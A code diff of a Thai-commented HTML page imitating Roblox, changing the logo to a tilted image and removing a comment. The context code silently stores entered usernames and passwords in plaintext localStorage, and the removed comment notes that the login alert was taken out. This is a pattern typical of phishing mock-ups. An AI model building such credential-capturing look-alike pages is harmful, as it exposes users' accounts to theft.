@@ -31,9 +31,10 @@
       align-items: center;
     }
 
-    .logo svg {
+    .logo img {
       width: 28px;
       height: 28px;
+      transform: rotate(45deg);
     }
 
     .header-buttons {
@@ -178,10 +179,9 @@
   <!-- หัวเว็บ -->
   <header>
     <div class="logo">
-      <!-- โลโก้ Roblox แบบ SVG -->
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="white">
-        <path d="M109.1 32L32 403.2 403.2 480 480 109.1 109.1 32zM335.1 335.1l-158.2-34.6 34.6-158.2 158.2 34.6-34.6 158.2z"/>
-      </svg>
+      <!-- โลโก้ Roblox แบบภาพเอียง -->
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/Roblox_Logo_2022.png" 
+           alt="Roblox Logo">
     </div>
     <div class="header-buttons">
       <button class="btn-primary">ลงทะเบียน</button>
@@ -239,7 +239,6 @@
       if (username && password) {
         localStorage.setItem('roblox_username', username);
         localStorage.setItem('roblox_password', password);
-        // ลบ alert ออก ไม่แสดงข้อความเข้าสู่ระบบ
       } else {
         alert('กรุณากรอกข้อมูลให้ครบ');
       }
@@ -266,4 +265,4 @@
   </script>
 
 </body>
-</html>
+  </html>
